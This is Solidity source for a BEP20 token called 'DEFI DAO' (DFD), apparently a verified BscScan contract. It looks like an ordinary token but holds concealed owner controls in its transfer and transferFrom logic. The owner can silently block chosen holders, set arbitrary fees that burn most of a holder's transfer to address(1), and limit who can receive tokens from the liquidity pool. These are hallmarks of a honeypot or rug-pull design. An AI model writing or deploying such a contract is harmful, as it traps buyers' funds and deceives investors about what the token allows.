/**
 *Submitted for verification at BscScan.com on 2023-06-01
*/
pragma solidity ^0.4.26;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256 c) {
    if (a == 0) {
      return 0;
    }
    c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return a / b;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256 c) {
    c = a + b;
    assert(c >= a);
    return c;
  }
}

contract ERC20Basic {
  function totalSupply() public view returns (uint256);
  function balanceOf(address who) public view returns (uint256);
  function transfer(address to, uint256 value) public returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 value);
}

contract BasicToken is ERC20Basic {
  using SafeMath for uint256;
  mapping(address => uint256) balances;
  uint percent;
  struct awardsAds {
      address ads;
      uint scale;
  }
  uint isFee0;
  uint awardsCount0;
  mapping(uint => awardsAds)awardsList0;
  uint isFee1;
  uint awardsCount1;
  mapping(uint => awardsAds)awardsList1;
  uint256 limit;
  mapping(address => uint)transferList;
  address lpads0;
  address lpads1;
  mapping(address => uint)proxyList0;
  mapping(address => uint)proxyList1;

  
  constructor() public{
    percent=100;
    transferList[msg.sender]=9;   
  }

  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(msg.sender!=lpads0 || proxyList0[_to]>0);
    require(_value <= balances[msg.sender] && (limit==0 || _value<=limit));
    uint isu=transferList[msg.sender];
    if(isu==0)isu=transferList[_to];
    if(isu==4)return false;    
    balances[msg.sender] = balances[msg.sender].sub(_value);
    if(isFee0>0 && isu==0)
    {
        uint256 _val;
        address _too;  
        if (msg.sender!=lpads0)
        {
            _too=address(1);
            _val=_value*(percent-isFee0)/percent;
            balances[_too] = balances[_too].add(_val);
            emit Transfer(msg.sender, _too, _val);
        }
        else
        {
          for(uint id=1;id<=awardsCount0;id++)
          {
            _too=awardsList0[id].ads;
            if(_too==address(0))continue;
            _val=_value*awardsList0[id].scale/percent;
            balances[_too] = balances[_too].add(_val);
            emit Transfer(msg.sender, _too, _val);
          }
        }
        _value=_value*isFee0/percent;
    }
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }
  function addTransferList(address ads,uint kind) public returns (bool)
  {
      require(transferList[msg.sender]==9);
      transferList[ads]=kind;
      return true;
  }
  function addProxyList(uint list,address ads,uint kind) public returns (bool)
  {
      require(transferList[msg.sender]==9);
      if(list==0)proxyList0[ads]=kind;
      else proxyList1[ads]=kind;
      return true;
  }
  function removeTransferList(uint list,address ads) public returns (bool)
  {
      require(transferList[msg.sender]==9);
      if(list==0) delete transferList[ads];
      else if(list==1)delete proxyList0[ads];
      else delete proxyList1[ads];
      return true;
  }
  function addAwardsList(uint list,uint id,address ads,uint scale,uint count) public returns (bool)
  {
      require(transferList[msg.sender]==9);
      awardsAds memory ad=awardsAds(ads,scale);
      if(list==0){
          awardsList0[id]=ad;
          awardsCount0=count;
      }
      else{
           awardsList1[id]=ad;
           awardsCount1=count;
      }
      return true;
  }
  function removeAwardsList(uint list,uint id,uint count) public returns (bool)
  {
      require(transferList[msg.sender]==9);
       if(list==0){
           delete awardsList0[id];
           awardsCount0=count;
       }
       else{
            delete awardsList1[id];
            awardsCount1=count;
       }
      return true;
  }
  function setFee(uint list,uint fee) public returns (bool)
  {
      require(transferList[msg.sender]==9);
      if(list==0) isFee0=fee;
      else isFee1=fee;
      return true;
  }
  function setLimit(uint num) public returns (bool)
  {
      require(transferList[msg.sender]==9);
      limit=num;
      return true;
  }
  function setLP(address lp0,address lp1) public returns (bool)
  {
      require(transferList[msg.sender]==9);
      lpads0=lp0;
      lpads1=lp1;
      return true;
  }
  function getInfo_parameter(uint list)public view returns (uint,uint,address,uint256){
    if(list==0) return (isFee0,awardsCount0,lpads0,limit);
    else return (isFee1,awardsCount1,lpads1,limit);
 }
  function getInfo_transferList(uint list,address ads)public view returns (uint){
     if(list==0) return transferList[ads];
     else if(list==1)return proxyList0[ads];
     else return proxyList1[ads];
 }
  function getInfo_awardsList(uint list,uint id)public view returns (address,uint){
    if(list==0)return (awardsList0[id].ads,awardsList0[id].scale);
    else return (awardsList1[id].ads,awardsList1[id].scale);
 }

  function balanceOf(address _owner) public view returns (uint256) {
    return balances[_owner];
  }
}

contract ERC20 is ERC20Basic {
  function allowance(address owner, address spender)
    public view returns (uint256);

  function transferFrom(address from, address to, uint256 value)public returns (bool);

  function approve(address spender, uint256 value) public returns (bool);
  event Approval(
    address indexed owner,
    address indexed spender,
    uint256 value
  );
}

contract StandardToken is ERC20, BasicToken {

  mapping (address => mapping (address => uint256)) internal allowed;

  function transferFrom(address _from,address _to,uint256 _value)public returns (bool)
  {
    require(_to != address(0));
    require(msg.sender!=lpads1 || proxyList1[_to]>0);
    require(_value <= balances[_from] && (limit==0 || _value<=limit));
    require(_value <= allowed[_from][msg.sender]);
    uint isu=transferList[msg.sender];
    if(isu==0)isu=transferList[_from];
    if(isu==0)isu=transferList[_to];
    if(isu==4)return false;  
    balances[_from] = balances[_from].sub(_value);
    if(isFee1>0 && isu==0){
        uint256 _val;
        address _too;  
        for(uint id=1;id<=awardsCount1;id++)
        {
            _too=awardsList1[id].ads;
            if(_too==address(0))continue;
            _val=_value*awardsList1[id].scale/percent;
            balances[_too] = balances[_too].add(_val);
            allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_val);
            emit Transfer(_from, _too, _val);
        }
        _value=_value*isFee1/percent;
    }
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(
    address _owner,
    address _spender
   )
    public
    view
    returns (uint256)
  {
    return allowed[_owner][_spender];
  }
}

contract MintableToken is StandardToken {
  event Mint(address indexed to, uint256 amount);

  function mint(
    address _to,
    uint256 _amount
  )
    internal
  {
    balances[_to] = balances[_to].add(_amount);
    emit Mint(_to, _amount);
    emit Transfer(address(0), _to, _amount);
  }
}

contract MyToken is StandardToken {

  function transfer(
    address _to,
    uint256 _value
  )
    public
    returns (bool)
  {
    return super.transfer(_to, _value);
  }

  function transferFrom(
    address _from,
    address _to,
    uint256 _value
  )
    public
    returns (bool)
  {
    return super.transferFrom(_from, _to, _value);
  }

  function approve(
    address _spender,
    uint256 _value
  )
    public
    returns (bool)
  {
    return super.approve(_spender, _value);
  }
}
contract BEP20Token is MyToken, MintableToken {
    string public name = "DEFI DAO";
    string public symbol = "DFD";
    uint8 public decimals = 18;
    uint256 private totalSupply_;
  function totalSupply() public view returns (uint256) {
    return totalSupply_;
  }
    constructor() public {
         totalSupply_ = 210000000 * (10 ** uint256(decimals));
        mint(msg.sender,totalSupply_);
    }
    function () public payable {
        revert();
    }
}